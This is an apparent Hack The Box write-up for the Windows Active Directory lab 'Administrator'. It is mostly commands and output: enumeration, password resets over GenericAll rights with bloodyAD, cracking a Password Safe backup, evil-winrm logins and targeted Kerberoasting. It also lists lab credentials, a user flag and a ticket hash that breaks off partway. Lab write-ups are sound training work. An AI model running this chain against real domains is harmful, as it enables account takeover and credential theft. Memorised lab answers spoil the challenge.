---
title: Administrator
type: htb-writeup
source: Hack The Box
platform: Windows
difficulty: Medium
tags: [htb, writeup, windows, active-directory, privilege-escalation, preserved]
status: preserved
---
# Administrator
OS: Windows\
Difficulty: Medium

## Steps
> We are to use the following provided credentials: *Olivia:ichliebedich*

### Recon
```Bash
┌─[us-vip-2]─[10.10.14.29]─[gntsqid@htb-anpw9jgddd]─[~]
└──╼ [★]$ nmap -p- -T5 --open -sV 10.10.11.42
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-23 17:58 CST
Nmap scan report for administrator.htb (10.10.11.42)
Host is up (0.066s latency).
Not shown: 64803 closed tcp ports (reset), 707 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-01-24 06:58:30Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
53052/tcp open  msrpc         Microsoft Windows RPC
62687/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
62692/tcp open  msrpc         Microsoft Windows RPC
62695/tcp open  msrpc         Microsoft Windows RPC
62712/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 76.22 seconds
```
```Bash
┌─[us-vip-2]─[10.10.14.29]─[gntsqid@htb-anpw9jgddd]─[~]
└──╼ [★]$ rpcclient -U 'olivia%ichliebedich' 10.10.11.42
rpcclient $> queryuser olivia
	User Name   :	olivia
	Full Name   :	Olivia Johnson
	Home Drive  :	
	Dir Drive   :	
	Profile Path:	
	Logon Script:	
	Description :	
	Workstations:	
	Comment     :	
	Remote Dial :
	Logon Time               :	Wed, 31 Dec 1969 18:00:00 CST
	Logoff Time              :	Wed, 31 Dec 1969 18:00:00 CST
	Kickoff Time             :	Wed, 13 Sep 30828 21:48:05 CDT
	Password last set Time   :	Sat, 05 Oct 2024 20:22:49 CDT
	Password can change Time :	Sun, 06 Oct 2024 20:22:49 CDT
	Password must change Time:	Wed, 13 Sep 30828 21:48:05 CDT
	unknown_2[0..31]...
	user_rid :	0x454
	group_rid:	0x201
	acb_info :	0x00000214
	fields_present:	0x00ffffff
	logon_divs:	168
	bad_password_count:	0x00000000
	logon_count:	0x00000000
	padding1[0..7]...
	logon_hrs[0..21]...
```
```Bash
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[olivia] rid:[0x454]
user:[michael] rid:[0x455]
user:[benjamin] rid:[0x456]
user:[emily] rid:[0x458]
user:[ethan] rid:[0x459]
user:[alexander] rid:[0xe11]
user:[emma] rid:[0xe12]
```

```Bash
[msf](Jobs:0 Agents:0) >> workspace -a administrator.htb
```
```Bash
msf](Jobs:0 Agents:0) >> use auxiliary/scanner/ftp/ftp_version 
[msf](Jobs:0 Agents:0) auxiliary(scanner/ftp/ftp_version) >> options

Module options (auxiliary/scanner/ftp/ftp_version):

   Name     Current Setting      Required  Description
   ----     ---------------      --------  -----------
   FTPPASS  mozilla@example.com  no        The password for the specified username
   FTPUSER  anonymous            no        The username to authenticate as
   RHOSTS                        yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/
                                           using-metasploit.html
   RPORT    21                   yes       The target port (TCP)
   THREADS  1                    yes       The number of concurrent threads (max one per host)


View the full module info with the info, or info -d command.

[msf](Jobs:0 Agents:0) auxiliary(scanner/ftp/ftp_version) >> setg rhosts 10.10.11.42
rhosts => 10.10.11.42
```
```Bash
[msf](Jobs:0 Agents:0) auxiliary(scanner/ftp/ftp_version) >> run

[+] 10.10.11.42:21        - FTP Banner: '220 Microsoft FTP Service\x0d\x0a'
[*] 10.10.11.42:21        - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
alternatively:
```Bash
┌─[us-vip-2]─[10.10.14.29]─[gntsqid@htb-anpw9jgddd]─[~]
└──╼ [★]$ nc -v 10.10.11.42 21
administrator.htb [10.10.11.42] 21 (ftp) open
220 Microsoft FTP Service
```
```Bash
┌─[us-vip-2]─[10.10.14.29]─[gntsqid@htb-anpw9jgddd]─[~]
└──╼ [★]$ smbmap -u 'olivia' -p 'ichliebedich' -H 10.10.11.42 -d administrator.htb
[+] IP: 10.10.11.42:445	Name: administrator.htb                                 
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share 
	SYSVOL                                            	READ ONLY	Logon server share
```
```Bash
[msf](Jobs:0 Agents:0) auxiliary(scanner/smb/smb_enumshares) >> set --clear smbpass 
smbpass => 
```
alternatively:
```Bash
[msf](Jobs:0 Agents:0) auxiliary(scanner/smb/smb_enumshares) >> options

Module options (auxiliary/scanner/smb/smb_enumshares):

   Name                    Current Setting                  Required  Description
   ----                    ---------------                  --------  -----------
   HIGHLIGHT_NAME_PATTERN  username|password|user|pass|Gro  yes       PCRE regex of resource names to highlight
                           ups.xml
   LogSpider               3                                no        0 = disabled, 1 = CSV, 2 = table (txt), 3 = one liner
                                                                      (txt) (Accepted: 0, 1, 2, 3)
   MaxDepth                999                              yes       Max number of subdirectories to spider
   RHOSTS                  10.10.11.42                      yes       The target host(s), see https://docs.metasploit.com/do
                                                                      cs/using-metasploit/basics/using-metasploit.html
   SMBDomain               administrator.htb                no        The Windows domain to use for authentication
   SMBPass                 ichliebedich                     no        The password for the specified username
   SMBUser                 olivia                           no        The username to authenticate as
   Share                                                    no        Show only the specified share
   ShowFiles               false                            yes       Show detailed information when spidering
   SpiderProfiles          true                             no        Spider only user profiles when share is a disk share
   SpiderShares            false                            no        Spider shares recursively
   THREADS                 1                                yes       The number of concurrent threads (max one per host)


View the full module info with the info, or info -d command.

[msf](Jobs:0 Agents:0) auxiliary(scanner/smb/smb_enumshares) >> run

[*] 10.10.11.42:139       - Starting module
[-] 10.10.11.42:139       - Login Failed: Unable to negotiate SMB1 with the remote host: Not a valid SMB packet
[*] 10.10.11.42:445       - Starting module
[!] 10.10.11.42:445       - peer_native_os is only available with SMB1 (current version: SMB3)
[!] 10.10.11.42:445       - peer_native_lm is only available with SMB1 (current version: SMB3)
[+] 10.10.11.42:445       - ADMIN$ - (DISK|SPECIAL) Remote Admin
[+] 10.10.11.42:445       - C$ - (DISK|SPECIAL) Default share
[+] 10.10.11.42:445       - IPC$ - (IPC|SPECIAL) Remote IPC
[+] 10.10.11.42:445       - NETLOGON - (DISK) Logon server share 
[+] 10.10.11.42:445       - SYSVOL - (DISK) Logon server share 
[*] 10.10.11.42:          - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```


```Bash
evil-winrm -i 10.1.11.42 -u 'administrator.htb\olivia' -p 'ichliedbedich'
```
```PowerShell
*Evil-WinRM* PS C:\Users\olivia\Documents> whoami /all

USER INFORMATION
----------------

User Name            SID
==================== ============================================
administrator\olivia S-1-5-21-1088858960-373806567-254189436-1108


GROUP INFORMATION
-----------------

Group Name                                  Type             SID          Attributes
=========================================== ================ ============ ==================================================
Everyone                                    Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.

```
```Bash
faketime 'now + 7 hours' impacket-GetUserSPNs-dc-ip 10.10.11.42 administrator.htb/olivia:ichliebedich -request -userfile ./users
```

Checking Nmap with *-sC*:
```Bash
Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-01-24T07:36:13
|_  start_date: N/A
|_clock-skew: 6h59m59s
```


> THE HASH GRAB FAILED SO JUAN PASSED IT TO ME
```Bash
┌─[us-vip-2]─[10.10.14.29]─[gntsqid@htb-anpw9jgddd]─[~]
└──╼ [★]$ hashcat --identify hash 
The following hash-mode match the structure of your input hash:

      # | Name                                                       | Category
  ======+============================================================+======================================
  19700 | Kerberos 5, etype 18, TGS-REP                              | Network Protocol
```

Start bloodhound database:
```Bash
sudo neo4j console
```
Then run bloodhound in another tab:
```Bash
bloodhound
# neo4j:neo4j
```
For now, it will be empty.\
We want to use bloodyAD to get some data
```Bash
bloodhound-python -u olivia -p 'ichliebedich' -d administrator.htb -c all -dc administrator.htb -gc administrator.htb
```


> FINALLY GOT BLOODHOUND TO WORK, AM USING PIHOLE AS DNS


> **Unavailable screenshot:** image. [Original GitHub attachment](https://github.com/user-attachments/assets/aa8a617c-df25-410f-a07e-4373e7416afd) returned 404 during the image audit (2026-10-08).


Using *shortest path to domain admins*\


> **Unavailable screenshot:** image. [Original GitHub attachment](https://github.com/user-attachments/assets/7f3f9b70-1f43-49fa-9cee-efc031755ba1) returned 404 during the image audit (2026-10-08).


> **Unavailable screenshot:** image. [Original GitHub attachment](https://github.com/user-attachments/assets/96911f0e-b8bb-4731-ab9a-42d35b4e25ca) returned 404 during the image audit (2026-10-08).


> tip: press *CTRL* to cycle through labels to see all
>>
> **Unavailable screenshot:** image. [Original GitHub attachment](https://github.com/user-attachments/assets/67efca54-42e5-4760-aa3a-664d947db2b2) returned 404 during the image audit (2026-10-08).


lets search for *group:Admin* and do shortest path to it\


> **Unavailable screenshot:** image. [Original GitHub attachment](https://github.com/user-attachments/assets/4b80c5f4-df20-40a0-aa2d-7c8cf1e1a953) returned 404 during the image audit (2026-10-08).


> **IGNORE ABOVE**

We want to do pathfinding from our user olivia to other users.\
Let's check out Michael.\
Enter Olivia's name in the search and do the little road icon for pathfinding followed by entering michael's name\


> **Unavailable screenshot:** image. [Original GitHub attachment](https://github.com/user-attachments/assets/afa8aebe-6a88-41a6-8bf9-e7c5ca3a62aa) returned 404 during the image audit (2026-10-08).


We can right-click and see that Olivia has *GenericAll* rights to Michael:\


> **Unavailable screenshot:** image. [Original GitHub attachment](https://github.com/user-attachments/assets/44352fa7-c7a8-4e50-880e-3e2b2944006f) returned 404 during the image audit (2026-10-08).


This means olivia can overwrite stuff on michael's account like say....a password...\
Why care about this? **Michael has GenericAll to the *Domain Admins* group!**
> **WAIT** actually, it is backwards...admins have generic all to michael of course...
```Bash
bloodyAD --host 10.10.11.42 -d administrator.htb -u olivia -p ichliebedich set password 'MICHAEL' 'NetSecWasHere!' 
```
> if that doesn't work see below:
```Bash
pip3 install --upgrade msldap
```
```Bash
┌──(kali㉿kali)-[~/Desktop/admin-bloodhound]
└─$ bloodyAD --host 10.10.11.42 -d administrator.htb -u olivia -p ichliebedich set password 'MICHAEL' 'NetSecWasHere!'
[+] Password changed successfully!
```
```PowerShell
┌──(kali㉿kali)-[~/Desktop/admin-bloodhound]
└─$ evil-winrm -i administrator.htb -u 'administrator\michael' -p 'NetSecWasHere!'
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\michael\Documents> whoami /all

USER INFORMATION
----------------

User Name             SID
===================== ============================================
administrator\michael S-1-5-21-1088858960-373806567-254189436-1109


GROUP INFORMATION
-----------------

Group Name                                  Type             SID          Attributes
=========================================== ================ ============ ==================================================
Everyone                                    Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

**Juan Suggests** I lok into the user Benjamin next:\


> **Unavailable screenshot:** image. [Original GitHub attachment](https://github.com/user-attachments/assets/50a71b4f-b486-4e77-8304-e0700a215355) returned 404 during the image audit (2026-10-08).


> **Unavailable screenshot:** image. [Original GitHub attachment](https://github.com/user-attachments/assets/0d7e4603-d5c0-48ee-ba76-cdcf72f14df7) returned 404 during the image audit (2026-10-08).


> It would appear we want to FTP as him
```Bash
┌──(kali㉿kali)-[~/Desktop/admin-bloodhound]
└─$ bloodyAD --host 10.10.11.42 -d administrator.htb -u michael -p 'NetSecWasHere!' set password 'BENJAMIN' 'NetSecWasHere!' 
[+] Password changed successfully!
                                                                                                                                                            
┌──(kali㉿kali)-[~/Desktop/admin-bloodhound]
└─$ ftp benjamin@10.10.11.42
Connected to 10.10.11.42.
220 Microsoft FTP Service
331 Password required
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> 
```
```Bash
ftp> dir
229 Entering Extended Passive Mode (|||54858|)
125 Data connection already open; Transfer starting.
10-05-24  08:13AM                  952 Backup.psafe3
226 Transfer complete.
ftp> get Backup.psafe3
local: Backup.psafe3 remote: Backup.psafe3
229 Entering Extended Passive Mode (|||54860|)
150 Opening ASCII mode data connection.
100% |***************************************************************************************************************|   952        5.02 KiB/s    00:00 ETA
226 Transfer complete.
WARNING! 3 bare linefeeds received in ASCII mode.
File may not have transferred correctly.
952 bytes received in 00:00 (3.36 KiB/s)
```
```Bash
┌──(kali㉿kali)-[~/Desktop/admin-bloodhound/admin-ftp]
└─$ ls
Backup.psafe3
                                                                                                                                                            
┌──(kali㉿kali)-[~/Desktop/admin-bloodhound/admin-ftp]
└─$ file Backup.psafe3      
Backup.psafe3: Password Safe V3 database
```
Let's check this out with hashcat.
```Bash                                                                                                                                                            
┌──(kali㉿kali)-[~/Desktop/admin-bloodhound/admin-ftp]
└─$ hashcat -h | grep -i safe                  
   9000 | Password Safe v2                                           | Password Manager
   5200 | Password Safe v3                                           | Password Manager
```
It is password safe, so lets continue:
```Bash
sudo apt install pwsafe
```


> **Unavailable screenshot:** image. [Original GitHub attachment](https://github.com/user-attachments/assets/62a2606a-5408-4123-b1e9-6b4e549ff9d7) returned 404 during the image audit (2026-10-08).


We don't know the password, so let's crack it!
```Bash
┌──(kali㉿kali)-[~/Desktop/admin-bloodhound/admin-ftp]
└─$ hashcat --identify Backup.psafe3 
The following 37 hash-modes match the structure of your input hash:

      # | Name                                                       | Category
  ======+============================================================+======================================
  13711 | VeraCrypt RIPEMD160 + XTS 512 bit (legacy)                 | Full-Disk Encryption (FDE)
  13712 | VeraCrypt RIPEMD160 + XTS 1024 bit (legacy)                | Full-Disk Encryption (FDE)
  13713 | VeraCrypt RIPEMD160 + XTS 1536 bit (legacy)                | Full-Disk Encryption (FDE)
  13741 | VeraCrypt RIPEMD160 + XTS 512 bit + boot-mode (legacy)     | Full-Disk Encryption (FDE)
  13742 | VeraCrypt RIPEMD160 + XTS 1024 bit + boot-mode (legacy)    | Full-Disk Encryption (FDE)
  13743 | VeraCrypt RIPEMD160 + XTS 1536 bit + boot-mode (legacy)    | Full-Disk Encryption (FDE)
  13751 | VeraCrypt SHA256 + XTS 512 bit (legacy)                    | Full-Disk Encryption (FDE)
  13752 | VeraCrypt SHA256 + XTS 1024 bit (legacy)                   | Full-Disk Encryption (FDE)
  13753 | VeraCrypt SHA256 + XTS 1536 bit (legacy)                   | Full-Disk Encryption (FDE)
  13761 | VeraCrypt SHA256 + XTS 512 bit + boot-mode (legacy)        | Full-Disk Encryption (FDE)
  13762 | VeraCrypt SHA256 + XTS 1024 bit + boot-mode (legacy)       | Full-Disk Encryption (FDE)
  13763 | VeraCrypt SHA256 + XTS 1536 bit + boot-mode (legacy)       | Full-Disk Encryption (FDE)
  13721 | VeraCrypt SHA512 + XTS 512 bit (legacy)                    | Full-Disk Encryption (FDE)
  13722 | VeraCrypt SHA512 + XTS 1024 bit (legacy)                   | Full-Disk Encryption (FDE)
  13723 | VeraCrypt SHA512 + XTS 1536 bit (legacy)                   | Full-Disk Encryption (FDE)
  13771 | VeraCrypt Streebog-512 + XTS 512 bit (legacy)              | Full-Disk Encryption (FDE)
  13772 | VeraCrypt Streebog-512 + XTS 1024 bit (legacy)             | Full-Disk Encryption (FDE)
  13773 | VeraCrypt Streebog-512 + XTS 1536 bit (legacy)             | Full-Disk Encryption (FDE)
  13781 | VeraCrypt Streebog-512 + XTS 512 bit + boot-mode (legacy)  | Full-Disk Encryption (FDE)
  13782 | VeraCrypt Streebog-512 + XTS 1024 bit + boot-mode (legacy) | Full-Disk Encryption (FDE)
  13783 | VeraCrypt Streebog-512 + XTS 1536 bit + boot-mode (legacy) | Full-Disk Encryption (FDE)
  13731 | VeraCrypt Whirlpool + XTS 512 bit (legacy)                 | Full-Disk Encryption (FDE)
  13732 | VeraCrypt Whirlpool + XTS 1024 bit (legacy)                | Full-Disk Encryption (FDE)
  13733 | VeraCrypt Whirlpool + XTS 1536 bit (legacy)                | Full-Disk Encryption (FDE)
   6211 | TrueCrypt RIPEMD160 + XTS 512 bit (legacy)                 | Full-Disk Encryption (FDE)
   6212 | TrueCrypt RIPEMD160 + XTS 1024 bit (legacy)                | Full-Disk Encryption (FDE)
   6213 | TrueCrypt RIPEMD160 + XTS 1536 bit (legacy)                | Full-Disk Encryption (FDE)
   6241 | TrueCrypt RIPEMD160 + XTS 512 bit + boot-mode (legacy)     | Full-Disk Encryption (FDE)
   6242 | TrueCrypt RIPEMD160 + XTS 1024 bit + boot-mode (legacy)    | Full-Disk Encryption (FDE)
   6243 | TrueCrypt RIPEMD160 + XTS 1536 bit + boot-mode (legacy)    | Full-Disk Encryption (FDE)
   6221 | TrueCrypt SHA512 + XTS 512 bit (legacy)                    | Full-Disk Encryption (FDE)
   6222 | TrueCrypt SHA512 + XTS 1024 bit (legacy)                   | Full-Disk Encryption (FDE)
   6223 | TrueCrypt SHA512 + XTS 1536 bit (legacy)                   | Full-Disk Encryption (FDE)
   6231 | TrueCrypt Whirlpool + XTS 512 bit (legacy)                 | Full-Disk Encryption (FDE)
   6232 | TrueCrypt Whirlpool + XTS 1024 bit (legacy)                | Full-Disk Encryption (FDE)
   6233 | TrueCrypt Whirlpool + XTS 1536 bit (legacy)                | Full-Disk Encryption (FDE)
   5200 | Password Safe v3                                           | Password Manager
```
```Bash
hashcat -m 5200 -a 0 Backup.psafe3 /usr/share/wordlists/rockyou.txt
```
> My VM sucks at running hashcat, so taking Juan's loot
>> Password is *tekieromucho*
>>
> **Unavailable screenshot:** image. [Original GitHub attachment](https://github.com/user-attachments/assets/6f1649f5-58b2-40b7-9c96-1b64310b9957) returned 404 during the image audit (2026-10-08).


> **Unavailable screenshot:** image. [Original GitHub attachment](https://github.com/user-attachments/assets/c1745359-6681-4c9d-83d2-5e005a8233a8) returned 404 during the image audit (2026-10-08).


> **Unavailable screenshot:** image. [Original GitHub attachment](https://github.com/user-attachments/assets/1ec5c317-2feb-4cc9-9b37-09c55bb3444f) returned 404 during the image audit (2026-10-08).


Double click to get copy the passwords to clipboard:
- alexander:UXLCI5iETUsIBoFVTj8yQFKoHjXmb
- emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb
- emma:UXLCI5iETUsIBoFVTj8yQFKoHjXmb
> wait i think these are all the same lol

Let us try *emily* first:
```PowerShell
┌──(kali㉿kali)-[~/Desktop/admin-bloodhound/admin-ftp]
└─$ evil-winrm -i administrator.htb -u 'administrator\emily' -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\emily\Documents> ls
*Evil-WinRM* PS C:\Users\emily\Documents> cd ..
*Evil-WinRM* PS C:\Users\emily> cd .\Desktop
*Evil-WinRM* PS C:\Users\emily\Desktop> ls


    Directory: C:\Users\emily\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        10/30/2024   2:23 PM           2308 Microsoft Edge.lnk
-ar---         1/24/2025  11:50 PM             34 user.txt

*Evil-WinRM* PS C:\Users\emily\Desktop> cat user.txt
d716c4b869d28ed4902e9d868351bc5a
```
> User flag: ***d716c4b869d28ed4902e9d868351bc5a***

If we were to check bloodhound better, we should see *according to Juan* that user *ethan* has *DCSync* permissions, so let's abuse those.\
Sterben reminder: look up what DCSync is again....
```Bash
┌──(kali㉿kali)-[~/Desktop/admin-bloodhound/admin-ftp]
└─$ bloodyAD --host 10.10.11.42 -d administrator.htb -u emily -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' set object "CN=ETHAN HUNT,CN=USERS,DC=ADMINISTRATOR,DC=HTB" servicePrincipalName -v 'evil/ethan'
[+] CN=ETHAN HUNT,CN=USERS,DC=ADMINISTRATOR,DC=HTB's servicePrincipalName has been updated
```
verify:
```Bash
┌──(kali㉿kali)-[~/Desktop/admin-bloodhound/admin-ftp]
└─$ impacket-GetUserSPNs administrator.htb/emily:'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' -dc-ip 10.10.11.42
Impacket v0.11.0 - Copyright 2023 Fortra

ServicePrincipalName  Name   MemberOf  PasswordLastSet             LastLogon  Delegation 
--------------------  -----  --------  --------------------------  ---------  ----------
evil/ethan            ethan            2024-10-12 16:52:14.117811  <never>
```
Now we get a kerberos ticket:
```Bash
┌──(kali㉿kali)-[~/Desktop/admin-bloodhound/admin-ftp]
└─$ faketime 'now + 7 hours' impacket-GetUserSPNs administrator.htb/emily:'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' -dc-ip 10.10.11.42 -request
Impacket v0.11.0 - Copyright 2023 Fortra

ServicePrincipalName  Name   MemberOf  PasswordLastSet             LastLogon  Delegation 
--------------------  -----  --------  --------------------------  ---------  ----------
evil/ethan            ethan            2024-10-12 16:52:14.117811  <never>               


[-] CCache file is not found. Skipping...
$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb/ethan*$dd0354bb7c0d18d35d75280c7de18f96$db0cde1a314ec8713aaeca363fe95435ea30c7d86c5cd9e7bc035743aa574c3fc4870148e7e899b73e3a55b9eb4648c88adb4b1cc05ad864074697412d3b2291e5963686b50757dc175f7273e2359dd9b90b36e8c5feccb0f62dff8993f9dac3cb750c2080855916433d17b01de78b8b9ce5d7d4f74588f3726198d69fba6bc5b47b0267500460996ccfd7e23b067d18b16757d295350277c5b56888ffbec93f22d0fe937e0d73861a08941a45a6db0e2c4645a66edb901c8492c1910201820ceb714f0b2e2c83a1f86f7cbbf11d25dccf7c1bbacdec025ee56e5836f0f2898c2ff812f3be5fd6d725c5e78257ac03fcec1a7e11f15b420ba0caa045b4b061cf5bd86f8d0fb3ed9c7c719f213e60e2db0594471e0323d0a55705a51fd0b59d80aac808956b0419e794c38f72a4f112cb07eca75a56382d87fa8de256c6d283685b690e7285b27ae39ba618760e13d78443d79872eb1fd350ee8215e18a98d8bb50cfbcda4107f853673ed49b9eb943126629e4466300423214394bd8d93085de2675558f4aaadb2aa65e9b2a49e5bc6e7bf7856b0edd4c7d559c457a17862af112192c5ad67ea3ba2e478e63089dfbd1c523740aebbd9f26ced21eb7f0aab3da940510abeaef6cd6b6d09864e076c9b9e60ea52ec2a52023e51874281fd820f2e6f9fa5543c00d46f94f41ea2afdadefde6a95d627e3eb27a8417f5bcbc3afd093aa5fce1e97c180eaca9b063a5369f7e256c7b2aea0ca3056fe8992c5b3da2eab0a00584efa8d20bcd47768d7d5631ee26908be0110af2d8bcf21b98fb22cbd606cf7f694e8c4d5a4ea8a7cc6b1f5f0306066a7d33fe45a5e65aa78df69c1498f1676f029cf62ee87bb3c9d85e626191dec4199f4259022dd67f1eac49a0523f4690fc812472bdc95df8663b9f1a7c2b36d23f06d627003e8320987ddcac866a2941fd1b672c256af522d8412286bcc07f3f4ca3bcb2c6fb87e67faef8314cbcb654c6ece1d272929b7f5ae3ba2d112acd2a9a89a58e1183fbfc2fe77aa6386e354526fdc493f4dc7bffec13541ff92b4d6f197202ac42600869acb23631c88c3bcec945f7a4261e84c763503affa2691df30373e145c00b4fc10d1df6973beb39c12e643f8c5e4c500b387f43e248153fd7704509b4971e9371b3b04d23a18ad3aeaf29827ea69495ae47f3d221e93e785630d5ea1cb0c8c4feda24166c22f69b17f8df1cd09d623e07d509970e62cbc9074537999ebe3ef912356c044c6e50a90a0bf0d0e89e7571a4b177ff04a5dc777baee267b91b988b7f5ad99b75b59a9ebfa690f8ae35473bd3191eba75a4674a1612eb2fa1c24c4bb4067895e3b5ff9fa91ad5022b527ce84bce9e1c816761ad906253f352dcf31f522b52b53c796a4b5c273b8c9994d6723a3074a2c15d842710a9860d78bcee0ac7597497d0946cb2aa662850b8168080870bcc6863faf69807e6262600b2e4db88235b26a992508ee21dce6dce7d5bb9a798dffe659192860a640e1be9997fdc572b0804e5c
```
ticket hash  alone:
```Bash
$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb/ethan*$dd0354bb7c0d18d35d75280c7de18f96$db0cde1a314ec8713aaeca363fe95435ea30c7d86c5cd9e7bc035743aa574c3fc4870148e7e899b73e3a55b9eb4648c88adb4b1cc05ad864074697412d3b2291e5963686b50757dc175f7273e2359dd9b90b36e8c5feccb0f62dff8993f9dac3cb750c2080855916433d17b01de78b8b9ce5d7d4f74588f3726198d69fba6bc5b47b0267500460996ccfd7e23b067d18b16757d295350277c5b56888ffbec93f22d0fe937e0d73861a08941a45a6db0e2c4645a66edb901c8492c1910201820ceb714f0b2e2c83a1f86f7cbbf11d25dccf7c1bbacdec025ee56e5836f0f2898c2ff812f3be5fd6d725c5e78257ac03fcec1a7e11f15b420ba0caa045b4b061cf5bd86f8d0fb3ed9c7c719f213e60e2db0594471e0323d0a55705a51fd0b59d80aac808956b0419e794c38f72a4f112cb07eca75a56382d87fa8de256c6d283685b690e7285b27ae39ba618760e13d78443d79872eb1fd350ee8215e18a98d8bb50cfbcda4107f853673ed49b9eb943126629e4466300423214394bd8d93085de2675558f4aaadb2aa65e9b2a49e5bc6e7bf7856b0edd4c7d559c457a17862af112192c5ad67ea3ba2e478e63089dfbd1c523740aebbd9f26ced21eb7f0aab3da940510abeaef6cd6b6d09864e076c9b9e60ea52ec2a52023e51874281fd820f2e6f9fa5543c00d46f94f41ea2afdadefde6a95d627e3eb27a8417f5bcbc3afd093aa5fce1e97c180eaca9b063a5369f7e256c7b2aea0ca3056fe8992c5b3da2eab0a00584efa8d20bcd47768d7d5631ee26908be0110af2d8bcf21b98fb22cbd606cf7f694e8c4d5a4ea8a7cc6b1f5f0306066a7d33fe45a5e65aa78df69c1498f1676f029cf62ee87bb3c9d85e626191dec4199f4259022dd67f1eac49a0523f4690fc812472bdc95df8663b9f1a7c2b36d2